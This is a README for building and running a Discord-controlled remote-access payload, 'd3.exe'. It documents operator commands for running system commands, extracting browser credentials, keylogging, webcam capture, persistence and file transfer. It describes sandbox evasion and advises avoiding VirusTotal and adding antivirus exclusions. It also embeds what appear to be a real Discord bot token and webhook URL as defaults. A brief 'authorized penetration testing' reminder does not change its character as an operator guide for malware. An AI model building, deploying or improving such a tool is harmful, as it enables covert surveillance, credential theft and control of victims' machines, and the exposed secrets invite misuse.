# Discord C2 Payload - Build Instructions

## Available Build Scripts

### 🚀 `quick_build.bat` (RECOMMENDED)
**One-click build with your default configuration**

- ✅ Automatically installs UV if needed
- ✅ Sets up virtual environment
- ✅ Installs all dependencies
- ✅ Uses your pre-configured defaults:
  - Name: `d3`
  - Guild ID: `1375935187250057216`
  - Bot Token: `MTM37NTkzNTQ5OTU0OTU0MDM3Mg.G0N_48.d3bL65IMOciVH89Ehi4oLjwWbf9yMRTKpIv41g`
  - Channel ID: `1375935188265209989`
  - Webhook: `https://discord.com/api/webhooks/1375937047998501057/uyPon8TtX2_JLYwUvP_h0fZchDvpmfhsocI1OjPrHd4l-BOolP3XwFf4ymO4uguw5boA`
- ✅ Builds `d3.exe` in `dist/` folder
- ✅ Cleans up temporary files

**Usage:**
```cmd
quick_build.bat
```

### 🛠️ `build_complete.bat`
**Interactive build with full control**

- ✅ Complete environment setup
- ✅ Option to use defaults or enter custom values
- ✅ Detailed progress reporting
- ✅ Comprehensive error handling
- ✅ Security reminders and usage instructions

**Usage:**
```cmd
build_complete.bat
```

### 📝 `build_from_config.bat`
**Build using config.json file**

- ✅ Reads configuration from `config.json`
- ✅ Good for scripted/automated builds
- ✅ Easy to version control settings

**Usage:**
1. Edit `config.json`
2. Run `build_from_config.bat`

## Default Configuration

Your default values are pre-configured in all scripts:

```json
{
    "name": "d3",
    "guild_id": "1375935187250057216",
    "bot_token": "MTM37NTkzNTQ5OTU0OTU0MDM3Mg.G0N_48.d3bL65IMOciVH89Ehi4oLjwWbf9yMRTKpIv41g",
    "channel_id": "1375935188265209989",
    "webhook": "https://discord.com/api/webhooks/1375937047998501057/uyPon8TtX2_JLYwUvP_h0fZchDvpmfhsocI1OjPrHd4l-BOolP3XwFf4ymO4uguw5boA"
}
```

## Prerequisites

### Automatic Installation
All build scripts will automatically:
- Install UV package manager if missing
- Create virtual environment
- Install all Python dependencies
- Install PyInstaller for building

### Manual Prerequisites (if needed)
- **Python 3.9+**: [python.org](https://python.org/downloads/)
- **UV Package Manager**: [docs.astral.sh/uv](https://docs.astral.sh/uv/getting-started/installation/)

## Build Output

All scripts create:
- `dist/d3.exe` (or custom name) - Final executable
- Automatic cleanup of temporary files
- Build logs and status messages

## Security Notes

⚠️ **Important Reminders:**
- Use only for authorized penetration testing
- Do not upload to VirusTotal or similar services
- Test in isolated environments first
- Keep bot tokens secure
- Follow responsible disclosure practices

## Discord Bot Commands

Once `d3.exe` is running on target:

### Basic Commands
- `/interact <id>` - Interact with specific agent
- `!ls` - List all active agents
- `/cmd <command>` - Execute system commands
- `/screenshot` - Take screenshot
- `/terminate` - Terminate agent

### Advanced Commands
- `/persistent` - Enable persistence
- `/creds` - Extract browser credentials
- `/process` - List running processes
- `/keylog start <interval>` - Start keylogger
- `/keylog stop` - Stop keylogger

### Interactive Features
- Click buttons for quick actions
- File upload/download capabilities
- Real-time system information
- Webcam capture support

## Troubleshooting

### Common Issues
1. **"UV not found"** - Script will auto-install
2. **"Python not found"** - Install Python 3.9+
3. **"Build failed"** - Run as administrator
4. **"Antivirus blocking"** - Add exclusion for project folder

### Build Process
1. Environment setup (UV, venv, dependencies)
2. Configuration (defaults or custom)
3. Template processing (placeholder replacement)
4. PyInstaller compilation
5. Cleanup and verification

## File Structure After Build

```
├── dist/
│   └── d3.exe                 # Your payload executable
├── discord_payload.py         # Template (unchanged)
├── quick_build.bat           # Recommended build script
├── build_complete.bat        # Interactive build script
├── build_from_config.bat     # Config-based build script
├── config.json               # Your default configuration
├── pyproject.toml            # UV project file
└── libraries/                # Core functionality
```

## Quick Start Summary

**For immediate use with your defaults:**
```cmd
quick_build.bat
```

**Result:** `dist/d3.exe` ready to deploy!

## Debug Mode

### Testing Your Payload

To verify your payload works correctly, use debug mode:

```cmd
d3.exe -d
```

**What Debug Mode Does:**
- 🐛 **Sends Debug Hit** - Immediate test message to your Discord server
- 📊 **Shows System Info** - Displays target system information in Discord
- 📝 **Terminal Logs** - Real-time logging of all operations
- 🛡️ **Bypasses Evasion** - Runs even in VMs/sandboxes for testing
- 📄 **Creates Log File** - Saves `debug.log` for troubleshooting
- ✅ **Verifies Connectivity** - Confirms Discord bot connection works

**Debug Discord Message:**
When you run with `-d`, you'll see a special debug message in Discord with:
- 🐛 Debug Hit notification
- 🖥️ System information (OS, User, IP, etc.)
- 🛡️ Security status (Admin, VM detection, evasion results)
- 🔍 Debug mode confirmation

**Terminal Output:**
```
============================================================
DEBUG MODE ENABLED
============================================================
Bot Token: MTM37NTkzNTQ5OTU0OTU0...
Guild ID: 1375935187250057216
Channel ID: 1375935188265209989
============================================================
[14:32:15] DEBUG: Starting payload in DEBUG MODE
[14:32:16] DEBUG: Sending debug hit to Discord server...
[14:32:17] DEBUG: Debug hit sent successfully!
[14:32:18] DEBUG: Sandbox evasion test: PASSED
[14:32:19] DEBUG: Starting Discord bot...
[14:32:20] DEBUG: Bot connected successfully
```

**Use Cases:**
- ✅ Verify payload functionality before deployment
- ✅ Test Discord bot connectivity and permissions
- ✅ Troubleshoot connection issues
- ✅ Confirm system information gathering works
- ✅ Debug sandbox evasion behavior

This is the fastest way to get your Discord C2 payload built and ready for deployment on Windows Server 2019.
